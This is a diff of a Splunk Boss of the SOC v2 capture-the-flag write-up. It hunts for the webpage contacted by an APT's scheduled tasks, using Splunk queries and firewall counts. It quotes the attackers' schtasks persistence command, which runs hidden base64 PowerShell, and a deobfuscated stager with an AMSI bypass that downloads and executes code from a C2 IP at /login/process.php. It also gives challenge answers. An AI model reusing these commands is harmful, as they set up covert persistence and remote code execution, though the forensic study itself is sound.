@@ -974,10 +974,9 @@ Answer is found int invoice.doc: Congrats! It looks like you have a virustotal a
 
 **Q6 To maintain persistence in the Frothly network, Taedonggang APT configured several Scheduled Tasks to beacon back to their C2 server. What single webpage is most contacted by these Scheduled Tasks? Answer example: index.php or images.html**
 
-Starting with index=botsv2 *schtasks*
+Almost certain the answer expected does not align with closest I found.
 
-To make it more viewable:
-
+Starting with index=botsv2 schtasks, to make it more viewable:
 ```
 index=botsv2 schtasks.exe
 | table _time host user CommandLine ParentImage powershell
@@ -996,8 +995,9 @@ Three occur in time ranges expected
 
 2017-08-24 04:04:26	wrk-klagerf	FROTHLY\service3	"C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:39 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 ```
-Simplify with just *schtasks* and interesting fields commandline there are 10 those, all three admin.php is in first one. So sort of dead end.
-Its beaconing so try:
+Simplify with just *schtasks* and interesting fields commandline there are 10 those, all three /admin/get.php is in first one. So sort of dead end can rule these out as only three based on the next event volume search.
+
+Looking shear volume of traffic to likely C2 does not indicate from scheduled task:
 ```
 index=botsv2 45.77.65.211
 | top uri
@@ -1016,7 +1016,7 @@ uri            count            percent
 /www-data/     2                0.041203
 /wp-login.php  2                0.041203
 ```
-Dropping the uri, jupitor, growler, gacrux, and venus seem to be most connections made to C2 IP.
+Dropping the uri, jupitor, growler, gacrux, and venus seem to be most connections made to C2 IP. Not sure of way to determine a pattern of connection.
 ```
 only 5 hosts were connected to
 jupiter 	86,737 	51.625% 	
@@ -1042,11 +1042,27 @@ Combining:
 index=botsv2 index=botsv2 45.77.65.211 uri
 | stats count by src_ip
 ```
+Taking a look at firewall destined to C2 45.77.65.211
+
+```
+sourcetype="pan:traffic" dest_ip=45.77.65.211
+| stats count by src_ip dest_port action app
+
+Output shows 2 interesting on port 9999 which are highly unusual port, from host growler, but only 2 30seconds apart. But not relevant to finding beaconing source. Interesting but irrelevant.
+
+src_ip	    dest_port	 action	       app	          count
+10.0.1.100	443	         allowed	   ssl	          11086
+10.0.1.101	443	         allowed	   ssl	          9139
+10.0.2.107	443	         allowed	   ssl	          16980
+10.0.2.109	443	         allowed	   ssl	          11190
+10.0.2.109	9999	     allowed	   web-browsing	  2
+```
+
+
+
 Source likely still uses members.php as most common connection to same IP. Looks like members.php is the answer that makes sense, but the actual answer is process.php. It only appears in one event in base64 code. 
-Using (show zero results):
-```
-index=botsv2 process.php
-```
+Using index=botsv2 process.php (show zero results as base 64 encoded in event data):
+
 It appears in a near identical payload to that shown earlier, only process.php is in it:
 ```
 [REF].ASSeMBlY.GEtTypE('System.Management.Automation.AmsiUtils....$ser='https://45.77.65.211:443';$t='/login/process.php';$DaTA=$WC.DowNloAdDATA($sEr $T);$iv=$DaTA[0..3];$dAta=$data[4..$datA.lenGTH];-jOiN[ChAr[]](& $R $dATA ($IV $K))|IEX
@@ -1064,4 +1080,4 @@ key_path="HKLM\software\microsoft\network\debug"
 data_type="REG_SZ"
 data="WwBSAEUARgBdAC4.....ADsAJABzAGUAcgA9ACcAaAB0AHQAcABzADoALwAvADQANQAuADcANwAuADYANQAuADIAMQAxADoANAA0ADMAJwA7ACQAdAA9ACcALwBsAG8AZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAHAAJwA7ACQARABhAFQAQQA9ACQAVwBDAC4ARABvAHcATgBsAG8AQQBkAEQAQQBUAEEAKAAkAHMARQByACsAJABUACkAOwAkAGkAdgA9ACQARABhAFQAQQBbADAALgAuADMAXQA7ACQAZABBAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAQQAuAGwAZQBuAEcAVABIAF0AOwAtAGoATwBpAE4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA" data section ends with the above address.
 ```
-
+Based on question "What single webpage is most contacted by these Scheduled Tasks?" It's not it if the other scheduled task was accessed 3 times and this just once. 
